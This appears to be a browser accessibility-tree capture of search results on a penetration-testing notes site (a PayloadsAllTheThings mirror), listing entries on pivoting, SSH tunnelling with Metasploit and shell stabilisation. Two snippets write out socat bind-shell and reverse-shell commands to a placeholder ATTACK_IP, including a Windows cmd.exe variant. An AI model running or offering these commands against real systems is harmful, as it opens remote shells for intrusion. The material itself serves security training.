+      - 'option "04 PIVOT SSH Portfwding with metasploit Confusion (Reverse Shells). The Two Separate Connections. When you exploit a service, there are TWO different network connections: Exploit Delivery (Metasploit → Web Service): Goes through the tunnel. RHOSTS=127.0.0.1, RPORT=9001." [ref=f11e1457] [cursor=pointer]':
+        - generic [ref=f11e1458]: "04"
+        - generic [ref=f11e1459]: PIVOT
+        - generic [ref=f11e1460]: SSH Portfwding with metasploit
+        - generic [ref=f11e1461]:
+          - text: Confusion
+          - mark [ref=f11e1462]: (Reverse
+          - mark [ref=f11e1463]: Shells).
+          - text: "The Two Separate Connections. When you exploit a service, there are TWO different network connections: Exploit Delivery (Metasploit → Web Service): Goes through the tunnel. RHOSTS=127.0.0.1, RPORT=9001."
+      - 'option "05 PIVOT SSH Tunneling & Port Forwarding Confusion (Reverse Shells). The Two Separate Connections. When you exploit a service, there are TWO different network connections: Exploit Delivery (Metasploit → Web Service): Goes through the tunnel. RHOSTS=127.0.0.1, RPORT=9001." [ref=f11e1467] [cursor=pointer]':
+        - generic [ref=f11e1468]: "05"
+        - generic [ref=f11e1469]: PIVOT
+        - generic [ref=f11e1470]: SSH Tunneling & Port Forwarding
+        - generic [ref=f11e1471]:
+          - text: Confusion
+          - mark [ref=f11e1472]: (Reverse
+          - mark [ref=f11e1473]: Shells).
+          - text: "The Two Separate Connections. When you exploit a service, there are TWO different network connections: Exploit Delivery (Metasploit → Web Service): Goes through the tunnel. RHOSTS=127.0.0.1, RPORT=9001."
+      - 'option "06 PIVOT Tunneling Tools … nect-timeout=1 Creating Reverse Shells. # Bind shell (target) socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane # Reverse shell (target to attacker) socat EXEC:/bin/bash TCP:ATTACK_IP:4444 # Windows reverse shell socat TCP:ATTACK_IP:4444 EXEC:''cmd.exe'',pipes" [ref=f11e1477] [cursor=pointer]':
+        - generic [ref=f11e1478]: "06"
+        - generic [ref=f11e1479]: PIVOT
+        - generic [ref=f11e1480]: Tunneling Tools
+        - generic [ref=f11e1481]:
+          - text: … nect-timeout=1 Creating
+          - mark [ref=f11e1482]: Reverse
+          - mark [ref=f11e1483]: Shells.
+          - text: "# Bind"
+          - mark [ref=f11e1484]: shell
+          - text: "(target) socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane #"
+          - mark [ref=f11e1485]: Reverse
+          - mark [ref=f11e1486]: shell
+          - text: "(target to attacker) socat EXEC:/bin/bash TCP:ATTACK_IP:4444 # Windows"
+          - mark [ref=f11e1487]: reverse
+          - mark [ref=f11e1488]: shell
+          - text: socat TCP:ATTACK_IP:4444 EXEC:'cmd.exe',pipes
+      - 'option "07 PIVOT Tunneling … nect-timeout=1 Creating Reverse Shells. # Bind shell (target) socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane # Reverse shell (target to attacker) socat EXEC:/bin/bash TCP:ATTACK_IP:4444 # Windows reverse shell socat TCP:ATTACK_IP:4444 EXEC:''cmd.exe'',pipes" [ref=f11e1492] [cursor=pointer]':
+        - generic [ref=f11e1493]: "07"
+        - generic [ref=f11e1494]: PIVOT
+        - generic [ref=f11e1495]: Tunneling
+        - generic [ref=f11e1496]:
+          - text: … nect-timeout=1 Creating
+          - mark [ref=f11e1497]: Reverse
+          - mark [ref=f11e1498]: Shells.
+          - text: "# Bind"
+          - mark [ref=f11e1499]: shell
+          - text: "(target) socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane #"
+          - mark [ref=f11e1500]: Reverse
+          - mark [ref=f11e1501]: shell
+          - text: "(target to attacker) socat EXEC:/bin/bash TCP:ATTACK_IP:4444 # Windows"
+          - mark [ref=f11e1502]: reverse
+          - mark [ref=f11e1503]: shell
+          - text: socat TCP:ATTACK_IP:4444 EXEC:'cmd.exe',pipes
+      - option "08 PWN Shell Stabilization & TTY Upgrades Upgrades, Shell Stabilisation & Restricted Shell Escapes. Comprehensive field guide for interactive shell spawning, stabilisation workflows, and restricted shell breakouts during authorised penetration tests. Table of Contents. Terminal Geometry (Rows" [ref=f11e1507] [cursor=pointer]:
+        - generic [ref=f11e1508]: "08"
+        - generic [ref=f11e1509]: PWN
+        - generic [ref=f11e1510]: Shell Stabilization & TTY Upgrades
+        - generic [ref=f11e1511]:
+          - text: Upgrades,
+          - mark [ref=f11e1512]: Shell
+          - text: Stabilisation & Restricted
+          - mark [ref=f11e1513]: Shell
+          - text: Escapes. Comprehensive field guide for interactive
+          - mark [ref=f11e1514]: shell
+          - text: spawning, stabilisation workflows, and restricted
+          - mark [ref=f11e1515]: shell
+          - text: breakouts during authorised penetration tests. Table of Contents. Terminal Geometry (Rows
+  - generic [ref=f11e1404]: Payloads — PayloadsAllTheThings mirror — DÆMON//SEC
